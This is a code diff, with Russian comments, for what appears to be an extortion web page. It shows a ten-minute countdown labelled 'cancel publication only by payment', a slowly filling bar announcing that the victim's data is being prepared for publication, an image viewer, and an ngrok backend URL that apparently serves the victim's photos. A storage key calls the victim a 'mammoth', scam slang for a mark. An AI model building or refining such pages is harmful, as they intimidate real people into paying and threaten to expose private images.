@@ -58,16 +58,13 @@
             font-family: 'Courier New', monospace;
             text-shadow: 0 0 20px rgba(255, 51, 85, 0.4);
         }
-        .timer-display.ended {
-            color: #ff0000;
-        }
         .timer-sub {
             color: #888;
             font-size: 11px;
             margin-top: 5px;
         }
         
-        /* ===== ПОЛОСКА ===== */
+        /* ===== ПОЛОСКА ЗАГРУЗКИ (НОВЫЙ БЛОК) ===== */
         .upload-progress {
             background: rgba(0, 255, 204, 0.05);
             border: 1px solid rgba(0, 255, 204, 0.2);
@@ -150,6 +147,7 @@
         .warning { color: #ff3355; font-size: 13px; margin-top: 10px; padding: 12px; border: 1px solid rgba(255,51,85,0.2); border-radius: 8px; background: rgba(255,51,85,0.05); }
         .size-info { color: #666; font-size: 11px; margin-top: 10px; }
         
+        /* ===== МОДАЛКА ===== */
         .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 9999; justify-content: center; align-items: center; padding: 20px; }
         .modal.active { display: flex; }
         .modal img { max-width: 100%; max-height: 90vh; border-radius: 10px; border: 2px solid #ff3355; box-shadow: 0 0 60px rgba(255,51,85,0.3); }
@@ -170,7 +168,7 @@
             <div class="timer-sub">⛔ Отменить публикацию можно только оплатой</div>
         </div>
 
-        <!-- ===== ПОЛОСКА ===== -->
+        <!-- ===== ПОЛОСКА ЗАГРУЗКИ ===== -->
         <div class="upload-progress">
             <div class="label">
                 <span>📤 ПОДГОТОВКА ДАННЫХ К ПУБЛИКАЦИИ</span>
@@ -217,7 +215,7 @@
         </div>
     </div>
 
-    <!-- МОДАЛКА -->
+    <!-- ===== МОДАЛЬНОЕ ОКНО ===== -->
     <div class="modal" id="modal">
         <span class="modal-close" id="modalClose">✕</span>
         <img id="modalImage" src="" alt="Увеличенное фото">
@@ -226,65 +224,30 @@
 
     <script>
         // ============================================================
-        // 1. УМНЫЙ ТАЙМЕР (НЕ СБРАСЫВАЕТСЯ ПРИ ОБНОВЛЕНИИ!)
+        // 1. ТАЙМЕР (10 МИНУТ)
         // ============================================================
-        const TOTAL_SECONDS = 600; // 10 минут
-        const TIMER_KEY = 'mammoth_timer_start';
+        let totalSeconds = 600;
         const timerDisplay = document.getElementById('timerDisplay');
-        const timerContainer = document.querySelector('.timer-container');
-        const timerLabel = document.querySelector('.timer-label');
         
-        let remainingSeconds = TOTAL_SECONDS;
-        let timerInterval = null;
-        
-        function startTimer() {
-            // Получаем время первого открытия
-            let startTime = localStorage.getItem(TIMER_KEY);
-            
-            if (startTime) {
-                // Если время уже сохранено, считаем сколько прошло
-                const elapsed = Math.floor((Date.now() - parseInt(startTime)) / 1000);
-                remainingSeconds = Math.max(0, TOTAL_SECONDS - elapsed);
-            } else {
-                // Если это первый визит, сохраняем текущее время
-                startTime = Date.now().toString();
-                localStorage.setItem(TIMER_KEY, startTime);
-                remainingSeconds = TOTAL_SECONDS;
-            }
-            
-            updateTimerDisplay();
-            
-            if (timerInterval) clearInterval(timerInterval);
-            
-            timerInterval = setInterval(function() {
-                if (remainingSeconds <= 0) {
-                    clearInterval(timerInterval);
-                    timerDisplay.textContent = '00:00';
-                    timerDisplay.classList.add('ended');
-                    timerContainer.style.borderColor = '#ff0000';
-                    timerLabel.textContent = '⛔ ДАННЫЕ ОПУБЛИКОВАНЫ';
-                    return;
-                }
-                
-                remainingSeconds--;
-                updateTimerDisplay();
-            }, 1000);
-        }
-        
-        function updateTimerDisplay() {
-            const mins = Math.floor(remainingSeconds / 60);
-            const secs = remainingSeconds % 60;
+        function updateTimer() {
+            const mins = Math.floor(totalSeconds / 60);
+            const secs = totalSeconds % 60;
             timerDisplay.textContent = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
+            if (totalSeconds <= 0) {
+                timerDisplay.textContent = '00:00';
+                timerDisplay.style.color = '#ff0000';
+                document.querySelector('.timer-container').style.borderColor = '#ff0000';
+                return;
+            }
+            totalSeconds--;
         }
-        
-        // ЗАПУСКАЕМ ТАЙМЕР
-        startTimer();
+        updateTimer();
+        setInterval(updateTimer, 1000);
 
         // ============================================================
-        // 2. ПОЛОСКА ЗАГРУЗКИ (СОХРАНЯЕТСЯ В localStorage)
+        // 2. ПОЛОСКА ЗАГРУЗКИ (МЕДЛЕННО РАСТЕТ)
         // ============================================================
-        const PROGRESS_KEY = 'mammoth_progress';
-        let progress = parseFloat(localStorage.getItem(PROGRESS_KEY)) || 0;
+        let progress = 0;
         const progressFill = document.getElementById('progressFill');
         const progressPercent = document.getElementById('progressPercent');
         const progressStatus = document.getElementById('progressStatus');
@@ -299,26 +262,23 @@
             '⏳ Ожидание подтверждения...',
             '✅ Публикация начата!'
         ];
-        let statusIndex = Math.min(Math.floor(progress / 15), statuses.length - 1);
-        progressStatus.textContent = statuses[statusIndex];
-        progressFill.style.width = progress + '%';
-        progressPercent.textContent = Math.round(progress) + '%';
+        let statusIndex = 0;
         
         function updateProgress() {
             if (progress >= 100) {
                 progressStatus.textContent = '✅ ДАННЫЕ ОПУБЛИКОВАНЫ!';
                 progressStatus.style.color = '#ff3355';
-                localStorage.removeItem(PROGRESS_KEY);
                 return;
             }
             
+            // Медленный рост: +0.05% за шаг (~2% в минуту)
             progress += 0.05;
             if (progress > 100) progress = 100;
             
-            localStorage.setItem(PROGRESS_KEY, progress.toString());
             progressFill.style.width = progress + '%';
             progressPercent.textContent = Math.round(progress) + '%';
             
+            // Меняем статус каждые ~15%
             const newIndex = Math.min(Math.floor(progress / 15), statuses.length - 1);
             if (newIndex !== statusIndex) {
                 statusIndex = newIndex;
@@ -328,6 +288,7 @@
             setTimeout(updateProgress, 1000);
         }
         
+        // Запускаем через 1 секунду после загрузки
         setTimeout(updateProgress, 1000);
 
         // ============================================================
@@ -335,7 +296,7 @@
         // ============================================================
         const path = window.location.pathname;
         const shortId = path.substring(1);
-        const NGROK_URL = 'https://3dcd-178-88-32-33.ngrok-free.app';
+        const NGROK_URL = 'https://2d2b-178-88-32-33.ngrok-free.app';
         
         let allImages = [];
         let currentImageIndex = 0;
